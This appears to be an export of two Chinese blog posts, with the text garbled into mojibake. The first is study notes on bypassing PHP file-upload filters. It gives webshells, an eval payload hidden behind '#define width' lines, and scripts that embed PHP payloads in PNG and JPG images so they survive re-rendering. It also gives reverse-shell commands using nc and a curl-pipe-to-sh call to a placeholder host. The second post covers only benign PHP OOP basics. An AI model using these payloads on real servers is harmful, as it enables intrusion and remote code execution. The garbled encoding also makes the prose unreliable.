é«˜çº§åˆ©ç”¨é…ç½®æ–‡ä»¶ç»•è¿‡.htaccessé…ç½®æ–‡ä»¶.user.inié…ç½®æ–‡ä»¶auto_append_file=1.txt\nä½¿ç”¨auto_append_fileå‚æ•°æ¥åŒ…å«è¿›è¡Œå½“å‰çš„phpæ–‡ä»¶ä¸€èµ·æ‰§è¡Œã€‚\n.user.iniè‡ªåŠ¨é™„åŠ æ–‡ä»¶æ—¶ï¼Œå½“å‰ç›®å½•å¿…é¡»è¦æœ‰phpæ–‡ä»¶\né…ç½®æ–‡ä»¶å¿…é¡»è¦æœ‰phpæ–‡ä»¶æ‰èƒ½ç”Ÿæ•ˆ\nç›´æ¥è®¿é—®é¦–é¡µï¼Œå³å¯æ‰§è¡Œä¸€å¥è¯æœ¨é©¬\næ–‡ä»¶å†…å®¹æ£€æµ‹åƒ&lt;?php , system , eval , $_GET, $_POSTå¦‚æœè¿™äº›å‡½æ•°è¢«ç¦ç”¨ï¼Œå³æ–‡ä»¶ä¸­å¸¦æœ‰è¿™äº›å‡½æ•°çš„æ–‡ä»¶éƒ½æ— æ³•ä¸Šä¼ ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨cookieä¼ è¾“æ•°æ®ï¼Œæˆ–è€…ç”¨ncåå¼¹shell\n1.ç”¨cookieä¼ è¾“æ•°æ®\n&lt;?=`$_COOKIE[1]`;\n\n`æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶åcookieä¼ è¾“\necho &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;|base64 -d&gt;1.php\nå†è¿æ¥1.php\n\n2.åå¼¹shell\n&lt;?= `nc ip port -e /bin/sh`;&lt;?= `curl curl https://your-shell.com/ip:port |sh`;\n\n3.ä½¿ç”¨phpä¼ªåè®®ï¼Œæ–‡ä»¶åŒ…å«\nauto_append_file=php://input\n4.æ—¥å¿—åŒ…å«\nauto_append_file=/var/log/nginx/access.log\næ³¨æ„.user.iniå†…å®¹çš„æ–‡ä»¶å\næ–‡ä»¶ä¸Šä¼ ä¸XSSå›¾ç‰‡ä¸Šä¼ getimagesizeç»•è¿‡æ‰«æå›¾ç‰‡ä¸­æ˜¯å¦å­˜åœ¨é«˜å®½ï¼Œå¦‚æœå­˜åœ¨å°±è®¤ä¸ºæ­£å¸¸\n#define height 100#define width 100&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\npngäºŒæ¬¡æ¸²æŸ“ç»•è¿‡ç›´æ¥ç”Ÿæˆä¸€ä¸ªæ–°å›¾ç‰‡ï¼Œæ¸…æ´—æ‰åŸæ¥çš„æ¶æ„ä»£ç \nè¿™é‡Œæˆ‘ä»¬ç”¨è„šæœ¬å†™ä¸€ä¸ªæ¶æ„ä»£ç ä¸ä¼šè¢«æ¸…æ´—çš„å›¾ç‰‡\n&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;2.png&#x27;);  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„/* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?&gt; */?&gt;\n\njpgäºŒæ¬¡æ¸²æŸ“ç»•è¿‡&lt;?php    $miniPayload = &quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;;    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;ç”¨æ³•  php exp.php a.png\n\næˆ‘ä»¬æ¥ä¸€ä¸ªjpgäºŒæ¬¡æ¸²æŸ“ç»•è¿‡çš„ä¸“ç”¨å›¾ç‰‡\n\n\né…åˆæ–‡ä»¶åŒ…å«\n\næ–‡ä»¶ä¸Šä¼ æœ€å®¹æ˜“å‡ºç°ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œï¼Œä¸”å±å®³å·¨å¤§\né…ç½®æ–‡ä»¶.user.iniä¸­ï¼Œauto_append_fileå‚æ•°ä¸ä»…å¯ä»¥å†™æ–‡ä»¶åï¼Œä¹Ÿå¯ä»¥æ˜¯ä¼ªåè®®å’Œnginxæ—¥å¿—\ngetimagesizeå‡½æ•°å¯ä»¥é€šè¿‡#define width 100æ¥ç»•è¿‡\npngå’ŒjpgäºŒæ¬¡æ¸²æŸ“åï¼Œä»å¯èƒ½ä¿ç•™æ¶æ„ä»£ç \n\n","tags":["Web","Study","PHP_upload"]},{"title":"Web_6_PHPååºåˆ—åŒ–","url":"/2022/10/20/web_6/","content":"ç¬¬ä¸€èŠ‚ phpåŸºç¡€ã€ç±»ä¸å¯¹è±¡è¯»æ–‡æ¡£ç±»ä¸å¯¹è±¡\n0x1 phpä¸­çš„é¢å‘å¯¹è±¡åœ¨å‰é¢çš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æœ€å°å‘½ä»¤å•å…ƒï¼Œæ˜¯å‡½æ•°æˆ–è€…è¯­è¨€ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸä¸ªå‡½æ•°ï¼ˆæ¯”å¦‚phpinfoï¼‰æ¥æ‰§è¡ŒæŸä¸ªæ“ä½œï¼Œè¿™ç§ä½¿ç”¨å•ç‹¬å‡½æ•°æ¥å®Œæˆç‰¹å®šåŠŸèƒ½çš„è¯­è¨€æ¨¡å¼ï¼Œæˆ‘ä»¬å«åšé¢å‘è¿‡ç¨‹ç¼–ç¨‹ã€‚é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ–¹æ³•çš„ä¼˜åŠ¿æ˜¯ä»£ç ç®€å•ï¼Œå¼€å‘è¿…é€Ÿï¼Œä¸è¶³ä¹‹å¤„å°±æ˜¯å¦‚æœåŠŸèƒ½ã€é€»è¾‘ã€æ•°æ®è¿›è¡Œå¤§é‡çš„å¢é•¿ï¼Œè¿™æ—¶å€™ï¼Œä»£ç ç»´æŠ¤éš¾åº¦å°†ä¼šæˆå€çš„å¢åŠ ï¼Œæ‰©å±•æ€§ã€å¯ç§»æ¤æ€§å°±å¤§å¤§é™ä½ã€‚\näºæ˜¯ä»¥Javaä¸ºä»£è¡¨çš„é¢å‘å¯¹è±¡ç¼–ç¨‹é¡ºåŠ¿è€Œå‡ºï¼Œè§£å†³äº†å¤æ‚é€»è¾‘ç©ºé—´ä¸‹çš„ç¼–ç æ¨¡å¼é—®é¢˜ï¼Œphpåœ¨æœ€å¼€å§‹çš„çº¯é¢å‘è¿‡ç¨‹é€æ­¥å‘é¢å‘å¯¹è±¡æ¨¡å¼æ”¹è¿›ï¼Œåœ¨ä¿æŒå…¶ä¸€è´¯çš„ç®€å•æ˜“å­¦ã€ç¼–ç å¿«é€Ÿçš„ä¼˜åŠ¿ä¸‹ï¼ŒåŒå‘å¯¹è±¡ä¹‹é—´å–å¾—å¹³è¡¡ã€‚\né¢å‘å¯¹è±¡çš„æ€æƒ³é¢å‘å¯¹è±¡çš„è®¾è®¡æ€æƒ³ä¸»è¦æœ‰\n\nç³»ç»Ÿä¸­ä¸€åˆ‡äº‹ç‰©çš†ä¸ºå¯¹è±¡\nå¯¹è±¡æ˜¯å±æ€§åŠå…¶æ“ä½œçš„å°è£…ä½“\nå¯¹è±¡å¯æŒ‰å…¶æ€§è´¨åˆ’åˆ†ä¸ºç±»ï¼Œå¯¹è±¡æˆä¸ºç±»çš„å®ä¾‹\nå®ä¾‹å…³ç³»å’Œç»§æ‰¿å…³ç³»æ˜¯å¯¹è±¡ä¹‹é—´çš„é™æ€å…³ç³»\næ¶ˆæ¯ä¼ é€’æ˜¯å¯¹è±¡ä¹‹é—´åŠ¨æ€è”ç³»çš„å”¯ä¸€å½¢å¼ï¼Œä¹Ÿæ˜¯è®¡ç®—çš„å”¯ä¸€å½¢å¼\næ–¹æ³•æ˜¯æ¶ˆæ¯çš„åºåˆ—\n\nphpé¢å‘å¯¹è±¡çš„ç‰¹ç‚¹é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹å¾ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€\nèšç±»åœ¨é¢å‘å¯¹è±¡çš„æ€è·¯ä¸Šï¼ŒåŠŸèƒ½ç›¸ä¼¼çš„å‡½æ•°é›†åˆåœ¨ä¸€èµ·\nå°†å®Œæˆä¸€ä¸ªå…±åŒåŠŸèƒ½çš„å‡½æ•°é›†ä¸­èµ·æ¥å°±æ˜¯èšç±»\nå°è£…åŠŸèƒ½å°è£…ï¼Œæ•°æ®å°è£…ï¼Œä¾›å†…éƒ¨å„ä¸ªæ–¹æ³•ä½¿ç”¨\néš”ç¦»è°ƒç”¨å¯¹è±¡ä»ä¸€ä¸ªè“å›¾è½¬æ¢åˆ°ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„äº§å“çš„è¿‡ç¨‹å«åšå®ä¾‹åŒ–\nä¿©ä¸ªå®ä¾‹ä¹‹é—´çš„å±æ€§ä¸èƒ½äº’ç›¸è®¿é—®ï¼Œåœ¨å¯¹è±¡å†…éƒ¨ï¼Œä¹Ÿä¸èƒ½ç›´æ¥è®¿é—®å¤–éƒ¨çš„å˜é‡ã€‚\nç»§æ‰¿ç»§æ‰¿å¯ä»¥ç†è§£ä¸ºå¯¹è±¡çš„åŒ…å«ï¼Œåœ¨phpä¸­å¯ä»¥ä½¿ç”¨extendså…³é”®å­—ç»§æ‰¿ç±»\nå¤šæ€åœ¨phpä¸­æ˜¯å¼±ç±»å‹,åœ¨å‚æ•°ä¼ é€’è¿‡ç¨‹ä¸­,å¯ä»¥æ”¹å˜å‚æ•°çš„å¯¹è±¡ç±»å‹,ä½œä¸ºå¯¹è±¡ä¾ç„¶æ˜¯å¯ä»¥ä¼ é€’è¿›å»,å½“åŒä¸€ä¸ªå‚æ•°ç”±ä¸åŒå¯¹è±¡å®ä¾‹ä¼ é€’,é‚£ä¹ˆè°ƒç”¨ç»“æœå°±å®ç°ä¸åŒçš„çŠ¶æ€\nä¾‹å¦‚ï¼š\nclass Command&#123;  function run($var)&#123;    $var-&gt;run();  &#125;&#125;\n\næˆ‘ä»¬æœ‰ä¸€ä¸ªcommandç±»ï¼Œå¥¹æœ‰ä¸€ä¸ªrunæ–¹æ³•ï¼Œä¼šæ‰§è¡Œå‚æ•°runæ–¹æ³•ï¼Œç„¶åæˆ‘ä»¬æœ‰ä¸¤ä¸ªå…¶ä»–å¯¹è±¡\nclass Command&#123;  function run ($var)&#123;  $var-&gt;run();  &#125;&#125;class Rabbit&#123;  function run&#123;    echo &quot;å…”å­è·‘äº†&quot;;  &#125;&#125;class Script&#123;  function run()&#123;    echo&quot;è„šæœ¬å·²å¯åŠ¨&quot;;  &#125;&#125;$command = new Command();$r = new Rabbit();$s = new Script();$command-&gt;run($r);$command-&gt;run($s);\n\n0x2 ç±»ä¸å¯¹è±¡ç±»çš„å±æ€§å’Œæ–¹æ³•æƒé™åœ¨phpä¸­ï¼Œç±»çš„å±æ€§å’Œæ–¹æ³•æƒé™æœ‰ä¸‰ä¸ªæƒé™ï¼Œåˆ†åˆ«ä¸º\n\npublic\nprotected\nprivate\n\npublicæƒé™è¢«å®šä¹‰ä¸ºå…¬æœ‰ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®\nğŸŒ°\nclass Command&#123;  public $cmd;&#125;$command = new Command();$command-&gt;cmd=&quot;whoami&quot;;\n\nè¿™é‡Œç”¨ç®­å¤´æ¥æŒ‡å‘ç±»çš„å±æ€§ï¼Œç®­å¤´ä¹‹åï¼Œä¸éœ€è¦$ç¬¦å·\nä¹Ÿå¯ä»¥ä½¿ç”¨varæ¥å®šä¹‰ç±»å±æ€§,å¦‚æœä½¿ç”¨varå®šä¹‰åˆ™é»˜è®¤publicæƒé™\nprotectedæƒé™è¢«å®šä¹‰ä¸ºå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®\nğŸŒ°\nclass Animal&#123;  protected $color;  function eat()&#123;  &#125;  function sleep()&#123;  &#125;&#125;class Human extends Animals&#123;  public $gender;  function getColor()&#123;    echo $this-&gt;color  &#125;&#125;\n\ncolorå±æ€§å¯ä»¥è¢«å­ç±»ç»§æ‰¿å¹¶è®¿é—®\nprivateæƒé™ç§æœ‰å±æ€§,åªèƒ½åœ¨ç±»è‡ªèº«ä¸­è®¿é—®,å…¶ä»–ä½ç½®ä¸èƒ½è®¿é—®,åŒ…æ‹¬ç»§æ‰¿å®ƒçš„ç±»\nğŸŒ°\nclass Animal&#123;  private $color;  function eat()&#123;  &#125;  private function sleep()&#123;  &#125;&#125;class Human extends Animals&#123;  public $gender;  function think()&#123;    &#125;&#125;//æ­£ç¡®ï¼Œç±»å®ä¾‹å¯ä»¥è®¿é—®åˆ°è‡ªèº«çš„ç§æœ‰å±æ€§$animal = new Animal();echo $animal -&gt;color;//é”™è¯¯,å­ç±»å®ä¾‹ä¸èƒ½è®¿é—®çˆ¶ç±»ç§æœ‰å±æ€§$human = new Human();echo $human -&gt;color;//é”™è¯¯,å­ç±»å®ä¾‹è°ƒç”¨ä¸äº†çˆ¶ç±»çš„ç§æœ‰æ–¹æ³•$human-&gt;sleep();\n\nç±»çš„å±æ€§å±æ€§å£°æ˜æ˜¯ç”±å…³é”®å­—publicã€protectedæˆ–è€…privateå¼€å¤´ï¼Œç„¶åè·Ÿä¸€ä¸ªæ™®é€šçš„å˜é‡å£°æ˜æ¥ç»„æˆã€‚å±æ€§ä¸­çš„å˜é‡å¯ä»¥åˆå§‹åŒ–ï¼Œä½†åˆå§‹åŒ–çš„å€¼å¿…é¡»æ˜¯å¸¸æ•°ï¼Œè¿™é‡Œçš„å¸¸æ•°æ˜¯æŒ‡PHPè„šæœ¬åœ¨ç¼–è¯‘é˜¶æ®µæ—¶å°±å¯ä»¥å¾—åˆ°å…¶å€¼ï¼Œè€Œä¸ä¾èµ–äºè¿è¡Œæ—¶çš„ä¿¡æ¯æ‰èƒ½æ±‚å€¼ã€‚\nğŸŒ°\n&lt;?phpclass Animal&#123;  public $name=&quot;panda&quot;; #åˆå§‹åŒ–  public function eat()&#123;  &#125;  public function sleep()&#123;  &#125;&#125;?&gt;\n\né™æ€å±æ€§æŒ‡ä¸ç”¨å®ä¾‹åŒ–ç±»å¯¹è±¡ï¼Œç›´æ¥é€šè¿‡ç±»åè®¿é—®çš„å±æ€§æˆ–è€…æ–¹æ³•\nå£°æ˜ç±»å±æ€§æˆ–æ–¹æ³•ä¸ºé™æ€ï¼Œå°±å¯ä»¥ä¸å®ä¾‹åŒ–ç±»è€Œç›´æ¥è®¿é—®ã€‚é™æ€å±æ€§ä¸èƒ½é€šè¿‡ä¸€ä¸ªç±»å·²å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®(ä½†é™æ€æ–¹æ³•å¯ä»¥)\n&lt;?phpclass Animal&#123;  public static $color;  function eat()&#123;    //è¿™é‡Œç›´æ¥é€šè¿‡ç±»åè°ƒç”¨ï¼Œä¸éœ€è¦å®ä¾‹åŒ–    Animal::sleep();  &#125;  private static function sleep()&#123;    return self::$color;    //ä½¿ç”¨åŒå†’å·æŒ‡å‘é™æ€å±æ€§  &#125;&#125;class Human extends Animal&#123;  public $gender;  function think()&#123;    return parent::$color;    //å­ç±»ä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®åˆ°çˆ¶ç±»çš„é™æ€æ–¹æ³•  &#125;&#125;\n\nfinalå±æ€§å¦‚æœä»£ç ä¸­æœ‰finalå…³é”®å­—å°±ä¸å…è®¸å­ç±»é‡å†™çˆ¶ç±»,å¦‚æœå­ç±»å¼ºåˆ¶é‡å†™çˆ¶ç±»å°±ä¼šæŠ¥é”™\nç±»çš„åˆ†ç±»å‰é¢æˆ‘ä»¬å®šä¹‰ç±»çš„æ—¶å€™,æ²¡æœ‰ä¿®é¥°,ç±»ä¹Ÿæ˜¯å¯ä»¥æœ‰ä¸åŒçš„ä¿®é¥°ç¬¦å·çš„\næŠ½è±¡ç±»ä½¿ç”¨abstractå…³é”®å­—å®šä¹‰æŠ½è±¡ç±»\nå®šä¹‰ä¸ºæŠ½è±¡çš„ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–.ä»»ä½•ä¸€ä¸ªç±»,å¦‚æœå®ƒé‡Œé¢è‡³å°‘æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯è¢«å£°æ˜ä¸ºæŠ½è±¡çš„,é‚£ä¹ˆè¿™ä¸ªç±»å°±å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡çš„.è¢«å®šä¹‰ä¸ºæŠ½è±¡çš„æ–¹æ³•åªæ˜¯å£°æ˜äº†å…¶è°ƒç”¨æ–¹å¼(å‚æ•°),ä¸èƒ½å®šä¹‰å…¶å…·ä½“çš„åŠŸèƒ½å®ç°.\nç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™,å­ç±»å¿…é¡»å®šä¹‰çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•;å¦å¤–,è¿™äº›æ–¹æ³•çš„è®¿é—®æ§åˆ¶å¿…é¡»å’Œçˆ¶ç±»ä¸­çš„ä¸€æ ·(æˆ–è€…æ›´ä¸ºå®½æ¾).ä¾‹å¦‚æŸä¸ªæŠ½è±¡æ–¹æ³•è¢«å£°æ˜ä¸ºå—ä¿æŠ¤ çš„,é‚£ä¹ˆå­ç±»ä¸­å®ç°çš„æ–¹æ³•å°±åº”è¯¥å£°æ˜ä¸ºå—ä¿æŠ¤çš„æˆ–è€…å…¬æœ‰çš„,è€Œä¸èƒ½è¢«å®šä¹‰ä¸ºç§æœ‰çš„.æ­¤å¤–æ–¹æ³•çš„è°ƒç”¨æ–¹å¼å¿…é¡»åŒ¹é…,å³ç±»å‹å’Œæ‰€éœ€å‚æ•°æ•°é‡å¿…é¡»ä¸€è‡´.ä¾‹å¦‚,å­ç±»å®šä¹‰äº†ä¸€ä¸ªå¯é€‰å‚æ•°,è€Œçˆ¶ç±»æŠ½è±¡æ–¹æ³•çš„å£°æ˜é‡Œæ²¡æœ‰,åˆ™ä¸¤è€…çš„å£°æ˜å¹¶æ— å†²çª.\nğŸŒ°\n&lt;?phpabstract class Animal&#123;  abstract function sleep();&#125;class Human extends Animal&#123;  function sleep()&#123;    echo &quot;in bed&quot;;  &#125;&#125;class Bird extends Animal&#123;  function sleep()&#123;    echo &quot;on tree&quot;;  &#125;&#125;$a = new Human();var_dump($a);\n\næŠ½è±¡ç±»çš„ä½œç”¨æ˜¯ä¿è¯ä»–çš„å­ç±»éƒ½æœ‰æŒ‡å®šçš„å…±åŒæ–¹æ³•,æ–¹ä¾¿å¤–éƒ¨è°ƒç”¨,è€Œä¸å…³å¿ƒå†…éƒ¨çš„å…·ä½“å®ç°\næ€»ä¹‹:\n\næŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ–,åªèƒ½å®ä¾‹åŒ–å­ç±»\næŠ½è±¡ç±»å¯ä»¥æœ‰å…·ä½“æ–¹æ³•,ä½†è‡³å°‘åº”è¯¥æœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•\nç»§æ‰¿æŠ½è±¡ç±»çš„å­ç±»å¿…é¡»å®ç°æŠ½è±¡ç±»çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•\n\næ¥å£ä½¿ç”¨interfaceæ¥å®šä¹‰,å¾ˆåƒæŠ½è±¡ç±»\nä½¿ç”¨æ¥å£(interface),å¯ä»¥æŒ‡å®šæŸä¸ªç±»å¿…é¡»å®ç°å“ªäº›æ–¹æ³•,ä½†ä¸éœ€è¦å®šä¹‰è¿™äº›æ–¹æ³•çš„å…·ä½“å†…å®¹.å…¶ä¸­å®šä¹‰çš„æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ç©ºçš„\næ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯å…¬æœ‰çš„,è¿™æ˜¯æ¥å£çš„ç‰¹æ€§\nè¦å®ç°ä¸€ä¸ªæ¥å£,ä½¿ç”¨implementsæ“ä½œç¬¦.ç±»ä¸­å¿…é¡»å®ç°æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•,å¦åˆ™ä¼šæŠ¥ä¸€ä¸ªè‡´å‘½é”™è¯¯.ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£,ç”¨é€—å·æ¥åˆ†éš”å¤šä¸ªæ¥å£çš„åç§°.\n&lt;?phpinterface a &#123;  public function foo();&#125;interface b &#123;  public function bar();&#125;interface c extends a ,b &#123;  public function baz();&#125;class d implements c &#123;  public function foo()&#123;  &#125;  public function bar()&#123;  &#125;  public  function baz()&#123;  &#125;&#125;?&gt;\n\næ¥å£å…è®¸ç»§æ‰¿,å®ç°æ¥å£,ä¹Ÿå…è®¸å®ç°å¤šä¸ªæ¥å£\ntraitPHP5.4èµ·,PHPå®ç°äº†ä¸€ç§ä»£ç å¤ç”¨çš„æ–¹æ³•,ä¸ºtrait\nTrait æ˜¯ä¸ºç±»ä¼¼phpå•ç»§æ‰¿è¯­è¨€è€Œå¤‡ç”¨çš„ä¸€ç§ä»£ç å¤ç”¨æœºåˆ¶.Trait ä¸ºäº†å‡å°‘å•ç»§æ‰¿è¯­è¨€çš„é™åˆ¶,ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿè‡ªç”±åœ°åœ¨ä¸åŒå±‚æ¬¡ç»“æ„å†…ç‹¬ç«‹çš„ç±»ä¸­å¤ç”¨method. Trait å’Œ classç»„åˆçš„è¯­ä¹‰å®šä¹‰äº†ä¸€ç§å‡å°‘å¤æ‚æ€§çš„æ–¹å¼,é¿å…ä¼ ç»Ÿå¤šç»§æ‰¿å’ŒMixinç±»ç›¸å…³å…¸å‹é—®é¢˜.\nTrait å’Œ Class ç›¸ä¼¼,ä½†ä»…ä»…æ—¨åœ¨ç”¨ç»†ç²’åº¦å’Œä¸€è‡´çš„æ–¹å¼æ¥ç»„åˆåŠŸèƒ½. æ— æ³•é€šè¿‡Trait è‡ªèº«æ¥å®ä¾‹åŒ–. å®ƒä¸ºä¼ ç»Ÿç»§æ‰¿å¢åŠ äº†æ°´å¹³ç‰¹æ€§çš„ç»„åˆ; ä¹Ÿå°±æ˜¯è¯´åº”ç”¨çš„å‡ ä¸ªClassä¹‹é—´ä¸éœ€è¦ç»§æ‰¿.\ntrait æ˜¯å¯ä»¥ç»„åˆçš„,ç”±å¤šä¸ªtraitæ„æˆä¸€ä¸ªæ–°çš„trait\n&lt;?php trait Hello &#123;  public function SayHello()&#123;    echo &#x27;hello&#x27;;  &#125;&#125;trait World &#123;  public function SayWorld()&#123;     echo &#x27;world&#x27;;  &#125;&#125;trait HelloWorld&#123;  use Hello, World;&#125;class MyHelloWorld &#123;  use HelloWorld;&#125;$o = new MyHelloWorld();$o -&gt; SayHello();$o -&gt; SayWorld();?&gt;\n\ntraité…åˆæ¥å£æˆ–è€…æŠ½è±¡ç±»\nåŒ¿åç±»åŒ¿åç±»æ˜¯ä¸ºäº†è§£å†³ä¸´æ—¶å®ç°æŸä¸ªæŠ½è±¡ç±»æˆ–è€…æ¥å£ç±»å®ä¾‹ç”¨çš„\nåŒ¿åç±»æˆ‘ä»¬å…³æ³¨çš„ç‚¹æ˜¯ä¸´æ—¶æ‰§è¡Œä¸‹æˆ‘ä»¬è‡ªå®šä¹‰çš„runæ–¹æ³•,è¿™ä¸ªç±»å…¶ä»–åœ°æ–¹ä¹Ÿç”¨ä¸åˆ°,æ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦ç»™å®ƒä¸“é—¨èµ·åå®šä¹‰,å ç”¨ä»£ç è¡Œæ•°,åæ­£Commandç±»çš„runæ–¹æ³•å…³å¿ƒçš„æ˜¯ä¼ å…¥çš„å¯¹è±¡æœ‰æ²¡æœ‰runæ–¹æ³•,è€Œä¸å…³å¿ƒä¼ å…¥çš„å¯¹è±¡å«ä»€ä¹ˆåå­—. \nğŸŒ°\n&lt;?phpclass Command &#123;  function run ($var)&#123;    return $var -&gt; run();  &#125;&#125;$command = new Command();echo $command-&gt;run (new class&#123;  function run()&#123;    return &quot;ä¸´æ—¶ç”¨çš„æ‰€ä»¥ä¸èµ·åå­—&quot;  &#125;&#125;); ?&gt;\n\nå¯¹è±¡åºåˆ—åŒ–æ‰€æœ‰PHPé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤º.unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›PHPåŸæ¥çš„å€¼. 